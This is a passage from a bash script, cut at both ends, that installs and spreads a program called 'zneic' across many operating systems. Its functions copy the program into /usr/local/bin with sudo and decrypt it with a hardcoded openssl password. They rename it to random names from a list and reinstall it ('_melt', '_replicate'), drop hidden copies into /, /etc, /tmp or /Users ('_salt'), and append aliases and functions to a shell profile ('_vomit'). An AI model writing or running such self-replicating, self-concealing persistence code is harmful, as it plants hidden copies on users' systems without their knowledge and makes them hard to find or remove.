   printf "$RED Not supported sys$NC\n"

  fi



}






_relist(){ #selft

   clear ; ls

   _u_data 2> /dev/null

}

_highlight(){ #selft

   _yellow ; clear ; ls ; quietTextRestore

   _u_data 2> /dev/null

}


_reveal(){ #selft

   _white ; clear ; ls -la ; quietTextRestore

   _u_data 2> /dev/null

}


_exec(){ #selfi




    _system="$(uname -s)"

  if [ $_system == "Darwin" ]; then #tw
    sudo chmod +x zneic
    sudo cp zneic /usr/local/bin/
    printf "$RED _nested$NC \n"
  elif [[ $_system == "Linux" ]]; then #tw
    sudo chmod +x zneic
    sudo cp zneic /usr/local/bin/
    printf "$RED _nested$NC \n"
  elif [[ $_system == "GNU" ]]; then #tw
    su
    chmod +x zneic
    cp zneic /usr/local/bin/
    printf "$RED _nested$NC \n"
  elif [[ $_system == "Haiku" ]]; then #tw
    chmod +x zneic
    #cp zneic /usr/local/bin/
    printf "$RED _nested$NC \n"
  elif [[ $_system == "HP-UX" ]]; then #tw
    sudo chmod +x zneic
    sudo cp zneic /usr/local/bin/
    printf "$RED _nested$NC \n"
  elif [[ $_system == "Minix" ]]; then #nn
    chmod +x zneic
    cp zneic /usr/local/bin/
    printf "$RED _nested$NC \n"
  elif [[ $_system == "OpenBSD" ]]; then #nn
    sudo chmod +x zneic
    sudo cp zneic /usr/local/bin/
    printf "$RED _nested$NC \n"
  elif [[ $_system == "SunOS" ]]; then #nn
    sudo chmod +x zneic
    sudo cp zneic /usr/local/bin/
    printf "$RED _nested$NC \n"
  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then #nn
    sudo chmod +x zneic
    sudo cp zneic /usr/local/bin/
    printf "$RED _nested$NC \n"
  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then #nn
    sudo chmod +x zneic
    sudo cp zneic /usr/local/bin/
    printf "$RED _nested$NC \n"
  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then #nn
    sudo chmod +x zneic
    sudo cp zneic /usr/local/bin/
    printf "$RED _nested$NC \n"
  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then #nn
    sudo chmod +x zneic
    sudo cp zneic /usr/local/bin/
    printf "$RED _nested$NC \n"
  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then #nn
    sudo chmod +x zneic
    sudo cp zneic /usr/local/bin/
    printf "$RED _nested$NC \n"
  elif [[ $_system == "OS/390" ]]; then #nn
    sudo chmod +x zneic
    sudo cp zneic /usr/local/bin/
    printf "$RED _nested$NC \n"
  else
     printf "$RED Not supported sys$NC\n"
  fi

}


_exec_b(){ #selfi

    _system="$(uname -s)"


    if [ $_system == "Darwin" ]; then

      if [ "$1" == "-d" ]; then
        cd ~ ; sudo rm -rf .sbk
      elif [[ "$1" == "-i" ]]; then
        cd ~ ; cd .sbk ; sh zneic -install ; cd ~
      elif [[ "$1" == "-id" ]]; then
        cd ~ ; cd .sbk ; sh zneic -install ; cd .. ; sudo rm -rf .sbk
      elif [[ "$1" == "-di" ]]; then
        cd ~ ; cd .sbk ; sh zneic -install ; cd .. ; sudo rm -rf .sbk
      else
        cd ~ ; mkdir .sbk ; cd .sbk
        sudo cp /usr/local/bin/zneic ./zneic
        cd ..
      fi

    elif [[ $_system == "Linux" ]]; then

      if [ "$1" == "-d" ]; then
        cd ~ ; sudo rm -rf .sbk
      elif [[ "$1" == "-i" ]]; then
        cd ~ ; cd .sbk ; sh zneic -install ; cd ~
      elif [[ "$1" == "-id" ]]; then
        cd ~ ; cd .sbk ; sh zneic -install ; cd .. ; sudo rm -rf .sbk
      elif [[ "$1" == "-di" ]]; then
        cd ~ ; cd .sbk ; sh zneic -install ; cd .. ; sudo rm -rf .sbk
      else
        cd ~ ; mkdir .sbk ; cd .sbk
        sudo cp /usr/local/bin/zneic ./zneic
        cd ..
      fi


     elif [[ $_system == "GNU" ]]; then

            if [ "$1" == "-d" ]; then
              su
              cd ~ ; rm -rf .sbk
            elif [[ "$1" == "-i" ]]; then
              su
              cd ~ ; cd .sbk ; sh zneic -install ; cd ~
            elif [[ "$1" == "-id" ]]; then
              su
              cd ~ ; cd .sbk ; sh zneic -install ; cd .. ; rm -rf .sbk
            elif [[ "$1" == "-di" ]]; then
              su
              cd ~ ; cd .sbk ; sh zneic -install ; cd .. ; rm -rf .sbk
            else
              su
              cd ~ ; mkdir .sbk ; cd .sbk
              cp /usr/local/bin/zneic ./zneic
              cd ..
            fi

      elif [[ $_system == "Haiku" ]]; then

            if [ "$1" == "-d" ]; then
              su
              cd ~ ; rm -rf .sbk
            elif [[ "$1" == "-i" ]]; then
              su
              cd ~ ; cd .sbk ; sh zneic -install ; cd ~
            elif [[ "$1" == "-id" ]]; then
              su
              cd ~ ; cd .sbk ; sh zneic -install ; cd .. ; rm -rf .sbk
            elif [[ "$1" == "-di" ]]; then
              su
              cd ~ ; cd .sbk ; sh zneic -install ; cd .. ; rm -rf .sbk
            else
              su
              cd ~ ; mkdir .sbk ; cd .sbk
              cp /usr/local/bin/zneic ./zneic
              cd ..
            fi

    elif [[ $_system == "HP-UX" ]]; then

        printf "$RED Not supported yet$NC\n"

    elif [[ $_system == "Minix" ]]; then

      if [ "$1" == "-d" ]; then
        su
        cd ~ ; rm -rf .sbk
      elif [[ "$1" == "-i" ]]; then
        su
        cd ~ ; cd .sbk ; sh zneic -install ; cd ~
      elif [[ "$1" == "-id" ]]; then
        su
        cd ~ ; cd .sbk ; sh zneic -install ; cd .. ; rm -rf .sbk
      elif [[ "$1" == "-di" ]]; then
        su
        cd ~ ; cd .sbk ; sh zneic -install ; cd .. ; rm -rf .sbk
      else
        su
        cd ~ ; mkdir .sbk ; cd .sbk
        cp /usr/local/bin/zneic ./zneic
        cd ..
      fi

    elif [[ $_system == "OpenBSD" ]]; then

      if [ "$1" == "-d" ]; then
        su
        cd ~ ; rm -rf .sbk
      elif [[ "$1" == "-i" ]]; then
        su
        cd ~ ; cd .sbk ; sh zneic -install ; cd ~
      elif [[ "$1" == "-id" ]]; then
        su
        cd ~ ; cd .sbk ; sh zneic -install ; cd .. ; rm -rf .sbk
      elif [[ "$1" == "-di" ]]; then
        su
        cd ~ ; cd .sbk ; sh zneic -install ; cd .. ; rm -rf .sbk
      else
        su
        cd ~ ; mkdir .sbk ; cd .sbk
        cp /usr/local/bin/zneic ./zneic
        cd ..
      fi

    elif [[ $_system == "SunOS" ]]; then

      printf "$RED Not supported yet$NC\n"

    elif [[ $_system == "CYGWIN_NT-5.0" ]]; then

      printf "$RED Not supported yet$NC\n"

    elif [[ $_system == "CYGWIN_NT-5.1" ]]; then

      printf "$RED Not supported yet$NC\n"

    elif [[ $_system == "CYGWIN_NT-6.0" ]]; then

      printf "$RED Not supported yet$NC\n"

    elif [[ $_system == "CYGWIN_NT-6.1" ]]; then

      printf "$RED Not supported yet$NC\n"

    elif [[ $_system == "CYGWIN_NT-10.0" ]]; then

      printf "$RED Not supported yet$NC\n"

    elif [[ $_system == "OS/390" ]]; then

      printf "$RED Not supported yet$NC\n"

    else

      printf "$RED Not supported sys$NC\n"

    fi


}

_melt(){ #selfc


if [ -f /usr/local/bin/zneic ]; then
   _loc=/usr/local/bin/zneic
else
  if [ -f ~/.spx/zneic ]; then
    _loc=~/.spx/zneic
  else
    openssl des -d -in zneic.sslz -out zneic -pass pass:cartof
    _loc=~/.spx/zneic
  fi
fi


    _system="$(uname -s)"





   if [ $_system == "Darwin" ]; then

     _rnd=$[RANDOM%50]
     _names=("flake" "blake" "plake" "blara" "marco" "white" "james" "alina" "leana" "slava" "horia" "moria" "power" "hound" "death" "cobra" "carlo" "oscar" "ninja" "nixon" "betty" "harry" "draco" "boris" "pepsi" "arpad" "soyuz" "force" "forta" "balon" "pablo" "narco" "diana" "andra" "tower" "tokyo" "baron" "texas" "paris" "trump" "archx" "genie" "bacon" "fruit" "masha" "moris" "elisa" "buyer" "brain" "water")

     _converted=$( echo ${_names[$_rnd]} | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
     _revved=$( echo ${_names[$_rnd]} | rev)

    cd ~ ; mkdir muee ; cd muee
    sudo cp $_loc ./zneic
    sudo cp zneic zneic2
    sh zneic -uninstall
    sudo rm -rf zneic
    cat zneic2 | sed "s/zneic/${_names[$_rnd]}/g" | sed "s/Z.N.E.I.C/$_converted/g" > ${_names[$_rnd]}
    sudo rm -rf zneic2 ; sh ${_names[$_rnd]} -qinstall ; sudo rm -rf ${_names[$_rnd]}
    cd .. ; sudo rm -rf muee

  elif [[ $_system == "Linux" ]]; then

    _rnd=$[RANDOM%50]
    _names=("flake" "blake" "plake" "blara" "marco" "white" "james" "alina" "leana" "slava" "horia" "moria" "power" "coral" "death" "cobra" "banel" "quran" "ninja" "nixon" "betty" "harry" "draco" "boris" "adolf" "arpad" "soyuz" "force" "forta" "balon" "pablo" "narco" "diana" "andra" "tower" "tokyo" "baron" "airfr" "paris" "trump" "archx" "genie" "bacon" "fruit" "masha" "moris" "elisa" "marii" "brain" "water")

    _converted=$( echo ${_names[$_rnd]} | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
    _revved=$( echo ${_names[$_rnd]} | rev)

    sudo cp $_loc ./zneic
    sudo cp zneic zneic2
    cat zneic2 | sed "s/zneic/${_names[$_rnd]}/g" | sed "s/Z.N.E.I.C/$_converted/g" > ${_names[$_rnd]}
    sudo rm -rf zneic2 ; printf "$_revved\n" ; sudo chmod +x ${_names[$_rnd]} ; sudo cp ${_names[$_rnd]} /usr/local/bin/
    sh zneic -uninstall
    sudo rm -rf zneic
    #sh ${_names[$_rnd]} -qinstall ; sudo rm -rf ${_names[$_rnd]}

  elif [[ $_system == "GNU" ]]; then

    _rnd=$[RANDOM%50]
    _names=("flake" "blake" "plake" "blara" "marco" "white" "james" "alina" "leana" "slava" "horia" "moria" "power" "coral" "death" "cobra" "banel" "quran" "ninja" "nixon" "betty" "harry" "draco" "boris" "adolf" "arpad" "soyuz" "force" "forta" "balon" "pablo" "narco" "diana" "andra" "tower" "tokyo" "baron" "airfr" "paris" "trump" "archx" "genie" "bacon" "fruit" "masha" "moris" "elisa" "marii" "brain" "water")

    _converted=$( echo ${_names[$_rnd]} | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
    _revved=$( echo ${_names[$_rnd]} | rev)

    su
    cat zneic | sed "s/zneic/${_names[$_rnd]}/g" | sed "s/Z.N.E.I.C/$_converted/g" > ${_names[$_rnd]}
    printf "$_revved\n" ; sh ${_names[$_rnd]} -qinstall
    sh zneic -uninstall
    rm -rf zneic

  elif [[ $_system == "Haiku" ]]; then

    _rnd=$[RANDOM%50]
    _names=("flake" "blake" "plake" "blara" "marco" "white" "james" "alina" "leana" "slava" "horia" "moria" "power" "coral" "death" "cobra" "banel" "quran" "ninja" "nixon" "betty" "harry" "draco" "boris" "adolf" "arpad" "soyuz" "force" "forta" "balon" "pablo" "narco" "diana" "andra" "tower" "tokyo" "baron" "airfr" "paris" "trump" "archx" "genie" "bacon" "fruit" "masha" "moris" "elisa" "marii" "brain" "water")

    _converted=$( echo ${_names[$_rnd]} | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
    _revved=$( echo ${_names[$_rnd]} | rev)


    cat zneic | sed "s/zneic/${_names[$_rnd]}/g" | sed "s/Z.N.E.I.C/$_converted/g" > ${_names[$_rnd]}
    printf "$_revved\n" ; sh ${_names[$_rnd]} -qinstall
    sh zneic -uninstall
    rm -rf zneic

  elif [[ $_system == "HP-UX" ]]; then

    printf "$RED Not supported yet$NC\n"

  elif [[ $_system == "Minix" ]]; then

    printf "$RED Not supported yet$NC\n"

  elif [[ $_system == "OpenBSD" ]]; then

    printf "$RED Not supported yet$NC\n"

  elif [[ $_system == "SunOS" ]]; then

    printf "$RED Not supported yet$NC\n"

  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then

    printf "$RED Not supported yet$NC\n"

  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then

    printf "$RED Not supported yet$NC\n"

  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then

    printf "$RED Not supported yet$NC\n"

  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then

    printf "$RED Not supported yet$NC\n"

  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then

    printf "$RED Not supported yet$NC\n"

  elif [[ $_system == "OS/390" ]]; then

    printf "$RED Not supported yet$NC\n"



  else

    printf "$RED Not supported sys$NC\n"

  fi




}

_replicate(){ #selfc


if [ -f /usr/local/bin/zneic ]; then
   _loc=/usr/local/bin/zneic
else
  if [ -f ~/.spx/zneic ]; then
    _loc=~/.spx/zneic
  else
    openssl des -d -in zneic.sslz -out zneic -pass pass:cartof
    _loc=~/.spx/zneic
  fi
fi


    _system="$(uname -s)"





    if [ $_system == "Darwin" ]; then

      _rnd=$[RANDOM%50]
      _names=("flake" "blake" "plake" "blara" "marco" "white" "james" "alina" "leana" "slava" "horia" "moria" "power" "coral" "death" "cobra" "banel" "quran" "ninja" "nixon" "betty" "harry" "draco" "boris" "adolf" "arpad" "soyuz" "force" "forta" "balon" "pablo" "narco" "diana" "andra" "tower" "tokyo" "baron" "airfr" "paris" "trump" "archx" "genie" "bacon" "fruit" "masha" "moris" "elisa" "marii" "brain" "water")

      _converted=$(echo ${_names[$_rnd]} | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
      _revved=$(echo ${_names[$_rnd]} | rev)

       sudo cp $_loc ./zneic
       sudo cp zneic zneic2
       cat zneic2 | sed "s/zneic/${_names[$_rnd]}/g" | sed "s/Z.N.E.I.C/$_converted/g" > ${_names[$_rnd]}
       sudo rm -rf zneic2 ; printf "$_revved\n" ; sh ${_names[$_rnd]} -qinstall ; sudo rm -rf ${_names[$_rnd]}

    elif [[ $_system == "Linux" ]]; then

      _rnd=$[RANDOM%50]
      _names=("flake" "blake" "plake" "blara" "marco" "white" "james" "alina" "leana" "slava" "horia" "moria" "power" "coral" "death" "cobra" "banel" "quran" "ninja" "nixon" "betty" "harry" "draco" "boris" "adolf" "arpad" "soyuz" "force" "forta" "balon" "pablo" "narco" "diana" "andra" "tower" "tokyo" "baron" "airfr" "paris" "trump" "archx" "genie" "bacon" "fruit" "masha" "moris" "elisa" "marii" "brain" "water")

      _converted=$(echo ${_names[$_rnd]} | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
      _revved=$(echo ${_names[$_rnd]} | rev)

       sudo cp $_loc ./zneic
       sudo cp zneic zneic2
       cat zneic2 | sed "s/zneic/${_names[$_rnd]}/g" | sed "s/Z.N.E.I.C/$_converted/g" > ${_names[$_rnd]}
       sudo rm -rf zneic2 ; printf "$_revved\n" ; sh ${_names[$_rnd]} -qinstall ; sudo rm -rf ${_names[$_rnd]}

     elif [[ $_system == "GNU" ]]; then

       _rnd=$[RANDOM%50]
       _names=("flake" "blake" "plake" "blara" "marco" "white" "james" "alina" "leana" "slava" "horia" "moria" "power" "coral" "death" "cobra" "banel" "quran" "ninja" "nixon" "betty" "harry" "draco" "boris" "adolf" "arpad" "soyuz" "force" "forta" "balon" "pablo" "narco" "diana" "andra" "tower" "tokyo" "baron" "airfr" "paris" "trump" "archx" "genie" "bacon" "fruit" "masha" "moris" "elisa" "marii" "brain" "water")

       _converted=$(echo ${_names[$_rnd]} | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
       _revved=$(echo ${_names[$_rnd]} | rev)

        sudo cp $_loc ./zneic
        sudo cp zneic zneic2
        cat zneic2 | sed "s/zneic/${_names[$_rnd]}/g" | sed "s/Z.N.E.I.C/$_converted/g" > ${_names[$_rnd]}
        sudo rm -rf zneic2 ; printf "$_revved\n" ; sh ${_names[$_rnd]} -qinstall ; sudo rm -rf ${_names[$_rnd]}

    elif [[ $_system == "Haiku" ]]; then

      _rnd=$[RANDOM%50]
      _names=("flake" "blake" "plake" "blara" "marco" "white" "james" "alina" "leana" "slava" "horia" "moria" "power" "coral" "death" "cobra" "banel" "quran" "ninja" "nixon" "betty" "harry" "draco" "boris" "adolf" "arpad" "soyuz" "force" "forta" "balon" "pablo" "narco" "diana" "andra" "tower" "tokyo" "baron" "airfr" "paris" "trump" "archx" "genie" "bacon" "fruit" "masha" "moris" "elisa" "marii" "brain" "water")

      _converted=$(echo ${_names[$_rnd]} | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
      _revved=$(echo ${_names[$_rnd]} | rev)

       sudo cp $_loc ./zneic
       sudo cp zneic zneic2
       cat zneic2 | sed "s/zneic/${_names[$_rnd]}/g" | sed "s/Z.N.E.I.C/$_converted/g" > ${_names[$_rnd]}
       sudo rm -rf zneic2 ; printf "$_revved\n" ; sh ${_names[$_rnd]} -qinstall ; sudo rm -rf ${_names[$_rnd]}


     elif [[ $_system == "HP-UX" ]]; then

       _rnd=$[RANDOM%50]
       _names=("flake" "blake" "plake" "blara" "marco" "white" "james" "alina" "leana" "slava" "horia" "moria" "power" "coral" "death" "cobra" "banel" "quran" "ninja" "nixon" "betty" "harry" "draco" "boris" "adolf" "arpad" "soyuz" "force" "forta" "balon" "pablo" "narco" "diana" "andra" "tower" "tokyo" "baron" "airfr" "paris" "trump" "archx" "genie" "bacon" "fruit" "masha" "moris" "elisa" "marii" "brain" "water")

       _converted=$(echo ${_names[$_rnd]} | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
       _revved=$(echo ${_names[$_rnd]} | rev)

        sudo cp $_loc ./zneic
        sudo cp zneic zneic2
        cat zneic2 | sed "s/zneic/${_names[$_rnd]}/g" | sed "s/Z.N.E.I.C/$_converted/g" > ${_names[$_rnd]}
        sudo rm -rf zneic2 ; printf "$_revved\n" ; sh ${_names[$_rnd]} -qinstall ; sudo rm -rf ${_names[$_rnd]}



      elif [[ $_system == "Minix" ]]; then

        _rnd=$[RANDOM%50]
        _names=("flake" "blake" "plake" "blara" "marco" "white" "james" "alina" "leana" "slava" "horia" "moria" "power" "coral" "death" "cobra" "banel" "quran" "ninja" "nixon" "betty" "harry" "draco" "boris" "adolf" "arpad" "soyuz" "force" "forta" "balon" "pablo" "narco" "diana" "andra" "tower" "tokyo" "baron" "airfr" "paris" "trump" "archx" "genie" "bacon" "fruit" "masha" "moris" "elisa" "marii" "brain" "water")

        _converted=$(echo ${_names[$_rnd]} | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
        _revved=$(echo ${_names[$_rnd]} | rev)

         sudo cp $_loc ./zneic
         sudo cp zneic zneic2
         cat zneic2 | sed "s/zneic/${_names[$_rnd]}/g" | sed "s/Z.N.E.I.C/$_converted/g" > ${_names[$_rnd]}
         sudo rm -rf zneic2 ; printf "$_revved\n" ; sh ${_names[$_rnd]} -qinstall ; sudo rm -rf ${_names[$_rnd]}

       elif [[ $_system == "OpenBSD" ]]; then

         _rnd=$[RANDOM%50]
         _names=("flake" "blake" "plake" "blara" "marco" "white" "james" "alina" "leana" "slava" "horia" "moria" "power" "coral" "death" "cobra" "banel" "quran" "ninja" "nixon" "betty" "harry" "draco" "boris" "adolf" "arpad" "soyuz" "force" "forta" "balon" "pablo" "narco" "diana" "andra" "tower" "tokyo" "baron" "airfr" "paris" "trump" "archx" "genie" "bacon" "fruit" "masha" "moris" "elisa" "marii" "brain" "water")

         _converted=$(echo ${_names[$_rnd]} | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
         _revved=$(echo ${_names[$_rnd]} | rev)

          sudo cp $_loc ./zneic
          sudo cp zneic zneic2
          cat zneic2 | sed "s/zneic/${_names[$_rnd]}/g" | sed "s/Z.N.E.I.C/$_converted/g" > ${_names[$_rnd]}
          sudo rm -rf zneic2 ; printf "$_revved\n" ; sh ${_names[$_rnd]} -qinstall ; sudo rm -rf ${_names[$_rnd]}

        elif [[ $_system == "SunOS" ]]; then

          _rnd=$[RANDOM%50]
          _names=("flake" "blake" "plake" "blara" "marco" "white" "james" "alina" "leana" "slava" "horia" "moria" "power" "coral" "death" "cobra" "banel" "quran" "ninja" "nixon" "betty" "harry" "draco" "boris" "adolf" "arpad" "soyuz" "force" "forta" "balon" "pablo" "narco" "diana" "andra" "tower" "tokyo" "baron" "airfr" "paris" "trump" "archx" "genie" "bacon" "fruit" "masha" "moris" "elisa" "marii" "brain" "water")

          _converted=$(echo ${_names[$_rnd]} | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
          _revved=$(echo ${_names[$_rnd]} | rev)

           sudo cp $_loc ./zneic
           sudo cp zneic zneic2
           cat zneic2 | sed "s/zneic/${_names[$_rnd]}/g" | sed "s/Z.N.E.I.C/$_converted/g" > ${_names[$_rnd]}
           sudo rm -rf zneic2 ; printf "$_revved\n" ; sh ${_names[$_rnd]} -qinstall ; sudo rm -rf ${_names[$_rnd]}

         elif [[ $_system == "CYGWIN_NT-5.0" ]]; then

           _rnd=$[RANDOM%50]
           _names=("flake" "blake" "plake" "blara" "marco" "white" "james" "alina" "leana" "slava" "horia" "moria" "power" "coral" "death" "cobra" "banel" "quran" "ninja" "nixon" "betty" "harry" "draco" "boris" "adolf" "arpad" "soyuz" "force" "forta" "balon" "pablo" "narco" "diana" "andra" "tower" "tokyo" "baron" "airfr" "paris" "trump" "archx" "genie" "bacon" "fruit" "masha" "moris" "elisa" "marii" "brain" "water")

           _converted=$(echo ${_names[$_rnd]} | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
           _revved=$(echo ${_names[$_rnd]} | rev)

            sudo cp $_loc ./zneic
            sudo cp zneic zneic2
            cat zneic2 | sed "s/zneic/${_names[$_rnd]}/g" | sed "s/Z.N.E.I.C/$_converted/g" > ${_names[$_rnd]}
            sudo rm -rf zneic2 ; printf "$_revved\n" ; sh ${_names[$_rnd]} -qinstall ; sudo rm -rf ${_names[$_rnd]}

       elif [[ $_system == "CYGWIN_NT-5.1" ]]; then

            _rnd=$[RANDOM%50]
            _names=("flake" "blake" "plake" "blara" "marco" "white" "james" "alina" "leana" "slava" "horia" "moria" "power" "coral" "death" "cobra" "banel" "quran" "ninja" "nixon" "betty" "harry" "draco" "boris" "adolf" "arpad" "soyuz" "force" "forta" "balon" "pablo" "narco" "diana" "andra" "tower" "tokyo" "baron" "airfr" "paris" "trump" "archx" "genie" "bacon" "fruit" "masha" "moris" "elisa" "marii" "brain" "water")

            _converted=$(echo ${_names[$_rnd]} | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
            _revved=$(echo ${_names[$_rnd]} | rev)

             sudo cp $_loc ./zneic
             sudo cp zneic zneic2
             cat zneic2 | sed "s/zneic/${_names[$_rnd]}/g" | sed "s/Z.N.E.I.C/$_converted/g" > ${_names[$_rnd]}
             sudo rm -rf zneic2 ; printf "$_revved\n" ; sh ${_names[$_rnd]} -qinstall ; sudo rm -rf ${_names[$_rnd]}

        elif [[ $_system == "CYGWIN_NT-6.0" ]]; then

             _rnd=$[RANDOM%50]
             _names=("flake" "blake" "plake" "blara" "marco" "white" "james" "alina" "leana" "slava" "horia" "moria" "power" "coral" "death" "cobra" "banel" "quran" "ninja" "nixon" "betty" "harry" "draco" "boris" "adolf" "arpad" "soyuz" "force" "forta" "balon" "pablo" "narco" "diana" "andra" "tower" "tokyo" "baron" "airfr" "paris" "trump" "archx" "genie" "bacon" "fruit" "masha" "moris" "elisa" "marii" "brain" "water")

             _converted=$(echo ${_names[$_rnd]} | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
             _revved=$(echo ${_names[$_rnd]} | rev)

              sudo cp $_loc ./zneic
              sudo cp zneic zneic2
              cat zneic2 | sed "s/zneic/${_names[$_rnd]}/g" | sed "s/Z.N.E.I.C/$_converted/g" > ${_names[$_rnd]}
              sudo rm -rf zneic2 ; printf "$_revved\n" ; sh ${_names[$_rnd]} -qinstall ; sudo rm -rf ${_names[$_rnd]}


      elif [[ $_system == "CYGWIN_NT-6.1" ]]; then

              _rnd=$[RANDOM%50]
              _names=("flake" "blake" "plake" "blara" "marco" "white" "james" "alina" "leana" "slava" "horia" "moria" "power" "coral" "death" "cobra" "banel" "quran" "ninja" "nixon" "betty" "harry" "draco" "boris" "adolf" "arpad" "soyuz" "force" "forta" "balon" "pablo" "narco" "diana" "andra" "tower" "tokyo" "baron" "airfr" "paris" "trump" "archx" "genie" "bacon" "fruit" "masha" "moris" "elisa" "marii" "brain" "water")

              _converted=$(echo ${_names[$_rnd]} | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
              _revved=$(echo ${_names[$_rnd]} | rev)

               sudo cp $_loc ./zneic
               sudo cp zneic zneic2
               cat zneic2 | sed "s/zneic/${_names[$_rnd]}/g" | sed "s/Z.N.E.I.C/$_converted/g" > ${_names[$_rnd]}
               sudo rm -rf zneic2 ; printf "$_revved\n" ; sh ${_names[$_rnd]} -qinstall ; sudo rm -rf ${_names[$_rnd]}

     elif [[ $_system == "CYGWIN_NT-10.0" ]]; then

               _rnd=$[RANDOM%50]
               _names=("flake" "blake" "plake" "blara" "marco" "white" "james" "alina" "leana" "slava" "horia" "moria" "power" "coral" "death" "cobra" "banel" "quran" "ninja" "nixon" "betty" "harry" "draco" "boris" "adolf" "arpad" "soyuz" "force" "forta" "balon" "pablo" "narco" "diana" "andra" "tower" "tokyo" "baron" "airfr" "paris" "trump" "archx" "genie" "bacon" "fruit" "masha" "moris" "elisa" "marii" "brain" "water")

               _converted=$(echo ${_names[$_rnd]} | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
               _revved=$(echo ${_names[$_rnd]} | rev)

                sudo cp $_loc ./zneic
                sudo cp zneic zneic2
                cat zneic2 | sed "s/zneic/${_names[$_rnd]}/g" | sed "s/Z.N.E.I.C/$_converted/g" > ${_names[$_rnd]}
                sudo rm -rf zneic2 ; printf "$_revved\n" ; sh ${_names[$_rnd]} -qinstall ; sudo rm -rf ${_names[$_rnd]}

       elif [[ $_system == "OS/390" ]]; then

         _rnd=$[RANDOM%50]
           _names=("flake" "blake" "plake" "blara" "marco" "white" "james" "alina" "leana" "slava" "horia" "moria" "power" "coral" "death" "cobra" "banel" "quran" "ninja" "nixon" "betty" "harry" "draco" "boris" "adolf" "arpad" "soyuz" "force" "forta" "balon" "pablo" "narco" "diana" "andra" "tower" "tokyo" "baron" "airfr" "paris" "trump" "archx" "genie" "bacon" "fruit" "masha" "moris" "elisa" "marii" "brain" "water")

           _converted=$(echo ${_names[$_rnd]} | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
           _revved=$(echo ${_names[$_rnd]} | rev)

            sudo cp $_loc ./zneic
            sudo cp zneic zneic2
            cat zneic2 | sed "s/zneic/${_names[$_rnd]}/g" | sed "s/Z.N.E.I.C/$_converted/g" > ${_names[$_rnd]}
            sudo rm -rf zneic2 ; printf "$_revved\n" ; sh ${_names[$_rnd]} -qinstall ; sudo rm -rf ${_names[$_rnd]}



    else

       printf "$RED Not supported sys$NC\n"

    fi



}


_salt(){ #selfs



if [ -f /usr/local/bin/zneic ]; then
   _loc=/usr/local/bin/zneic
else
  if [ -f ~/.spx/zneic ]; then
    _loc=~/.spx/zneic
  else
    openssl des -d -in zneic.sslz -out zneic -pass pass:cartof
    _loc=~/.spx/zneic
  fi
fi

   _rnd=$[RANDOM%3]




   if [ "$(echo $1 | grep -c 'v')" == "1" ]; then

     _paths=("/Users" "/etc" "/tmp" "/")

     sudo cp $_loc ./zneic
     sudo cp zneic ${_paths[$_rnd]}/.zneic
     sudo rm -rf zneic
     printf "$_name salted to $RED${_paths[$_rnd]}$NC\n"

   elif [[ "$(echo $1 | grep -c 's')" == "1" ]]; then

     _paths=("/Users" "/etc" "/tmp" "/")

     if [[ "$(echo $2 | grep -c 'v')" == "1" ]]; then
       sudo cp zneic ./.zneic
       sudo cp zneic ./.zneic
       sudo rm -rf zneic
       zneic -meta -e .zneic
       sudo cp .zneic.sslz ${_paths[$_rnd]}/.zneic.sslz
       cd ~
       printf "$_name salted to $RED${_paths[$_rnd]}$NC\n"
     else
       sudo cp $_loc ./zneic
       sudo cp zneic ./.zneic
       sudo rm -rf zneic
       zneic -meta -e .zneic
       sudo cp .zneic.sslz ${_paths[$_rnd]}/.zneic.sslz
       cd ~
     fi

   else

     _paths=("/Users" "/etc" "/tmp" "/")

     sudo cp $_loc ./zneic
     sudo cp zneic ${_paths[$_rnd]}/.zneic
     sudo rm -rf zneic

   fi


   _u_data 2> /dev/null


}

_vomit(){ #selfc

echo " " >> $1
echo "export PS1=\">>> \"" >> $1
echo " " >> $1
echo "# Aliases " >> $1
echo " " >> $1
echo "alias rip=\"sudo kill -9\"" >> $1
echo "alias off=\"sudo airport -z\"" >> $1
echo "alias lock=\"pmset displaysleepnow\"" >> $1
echo "alias die=\"killall Terminal\"" >> $1
echo "alias ll=\"ls -FGlAh\"" >> $1
echo "alias home=\"cd ~\"" >> $1
echo "alias root=\"cd /\"" >> $1
echo "alias ?=\"file\"" >> $1
echo "alias _edit=\"nano ~/.bash_profile\"" >> $1
echo "alias _update\"source ~/.bash_profile\"" >> $1
echo "alias refresh=\"_update ; clear\"" >> $1
echo "alias relist=\"_update ; clear ; ls\"" >> $1
echo "alias highlight=\"_update ; _yellow ; clear ; ls ; quietTextRestore\"" >> $1
echo "alias reveal=\"_white ; _update ; clear ; ls -la ; quietTextRestore\"" >> $1
echo "alias rn=\"react-native\"" >> $1
echo "alias ther=\"while true" >> $1
echo "do" >> $1
echo "    temp" >> $1
echo "    sleep 7" >> $1
echo "done\"" >> $1
echo " " >> $1
echo "# Functions " >> $1
echo " " >> $1
echo "cd() { builtin cd \"\$@\"; ls ;}" >> $1
echo "_+() { open -a \$1 \$2 ;}" >> $1
echo "_a() { open -a /Applications/\"\$1.app\"/Contents/MacOS/\$1 ;}" >> $1
